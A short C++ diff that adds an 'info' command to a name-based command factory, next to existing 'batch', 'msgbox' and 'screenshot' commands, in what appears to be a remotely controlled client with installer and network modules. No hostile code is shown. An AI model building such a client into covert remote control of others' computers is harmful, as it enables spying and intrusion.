@@ -4,10 +4,10 @@
 #include "Installer.h"
 #include "Network.h"
 #include "Settings.h"
-#include "Info.h"
 #include "Util.h"
 #include "Command.h"
 #include "Command_batch.h"
+#include "Command_info.h"
 #include "Command_msgbox.h"
 #include "Command_screenshot.h"
 
@@ -20,6 +20,8 @@ static Command *CreateCommandFromName(const std::string &name)
 {
 	if(name == "batch")
 		return new Command_batch();
+	else if(name == "info")
+		return new Command_info();
 	else if(name == "msgbox")
 		return new Command_msgbox();
 	else if(name == "screenshot")
